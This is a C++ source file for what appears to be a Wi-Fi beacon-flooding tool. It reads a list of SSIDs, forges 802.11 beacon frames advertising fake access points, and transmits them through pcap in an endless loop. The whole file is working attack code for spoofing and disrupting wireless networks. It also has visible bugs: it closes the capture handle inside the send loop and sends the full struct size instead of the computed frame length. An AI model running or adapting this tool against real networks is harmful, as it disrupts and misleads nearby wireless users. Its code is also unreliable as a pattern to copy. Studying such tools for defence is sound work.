#include "beacon-flooding.hpp"

beaconFlood::beaconFlood(const std::string& msgFile,std::string dev) {
    std::ifstream ifs(msgFile.data(), std::ios::in);
    std::string SSID;

    if(ifs.fail()) return;
    this->dev = dev;

    while(not ifs.eof()) {
        getline(ifs, SSID);
        if(SSID.empty()) break;

        SSIDList.push_back(SSID);
    }
}

void beaconFlood::init(beaconFrame& packet) {
    packet.radioHdr.it_version = 0;
    packet.radioHdr.it_pad = 0;
    packet.radioHdr.it_len = sizeof(radiotap);
    packet.radioHdr.it_present = 0;

    packet.beaconHdr.version = 0;
    packet.beaconHdr.type = Dot11Hdr::MANAGEMENT_FRAMES;
    packet.beaconHdr.subtype = Dot11Hdr::Beacon;
    packet.beaconHdr.flags = 0;
    packet.beaconHdr.duration = 0;
    packet.beaconHdr.addr1_ = Mac::broadcastMac();
    packet.beaconHdr.addr2_ = startMac;
    packet.beaconHdr.addr3_ = startMac;
    packet.beaconHdr.frag = 0;
    packet.beaconHdr.seq = 0;

    packet.beaconHdr.fix.timestamp = 0;
    packet.beaconHdr.fix.beaconInterval = 0x6400;
    packet.beaconHdr.fix.capabilities = 0x0011;
}

void beaconFlood::run() {
    std::vector<beaconFrame> packets;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap;
    int res;

    pcap = pcap_open_live(dev.data(), BUFSIZ, 0, 0, errbuf);
    if(pcap == NULL) {
        std::cerr << "Error: Error while open device ";
        std::cerr << errbuf << std::endl;

        return;
    }

    for(std::string& SSID : SSIDList) {
        beaconFrame packet;

        init(packet);

        beaconHeader::Tag* tag = packet.beaconHdr.firstTag();
        tag->identifier = beaconHeader::TagSsidParameterSet;
        tag->length = SSID.size();
        memcpy((uint8_t*)tag->value(), SSID.data(), SSID.size());
        tag = tag->next();

        tag->identifier = beaconHeader::TagSupportedRated;
        tag->length = 8;
        uint8_t* pointer = (uint8_t*)tag->value();
        *pointer++ = 0x82;
        *pointer++ = 0x84;
        *pointer++ = 0x8b;
        *pointer++ = 0x96;
        *pointer++ = 0x24;
        *pointer++ = 0x30;
        *pointer++ = 0x48;
        *pointer++ = 0x6c;
        tag = tag->next();

        tag->identifier = beaconHeader::TagDsParameterSet;
        tag->length = 1;
        (*(uint8_t*)tag->value()) = this->channel;
        tag = tag->next();

        tag->identifier = beaconHeader::TagTrafficIndicationMap;
        tag->length = sizeof(beaconHeader::TrafficIndicationMap) - sizeof(beaconHeader::Tag);
        beaconHeader::TrafficIndicationMap* tim = (beaconHeader::TrafficIndicationMap*)(tag);
        tim->DITMCount = 0;
        tim->DITMPeriod = 3;
        tim->bitmapControl = 0;
        tim->partialVirtiualBitmap = 0;
        tag = tag->next();

        uint8_t vender[] = "\xdd\x18\x00\x50\xf2\x01\x01\x00\x00\x50\xf2\x04\x01\x00\x00\x50\xf2\x04\x01\x00\x00\x50\xf2\x02\x00\x00";
        memcpy(tag, vender, sizeof(vender) - 1);
        tag = tag->next();

        packet.size = (uint8_t*)tag - (uint8_t*)(&packet);
        packets.push_back(packet);
    }
    
    while( true ) {
        for(beaconFrame& packet : packets) {
            if(pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet))) {
                std::cerr << "Error: Error while send packet\n";
                std::cerr << pcap_geterr(pcap) << std::endl;

                return;
            }

            usleep(10000);
        }

        pcap_close(pcap);
    }

    return;
}
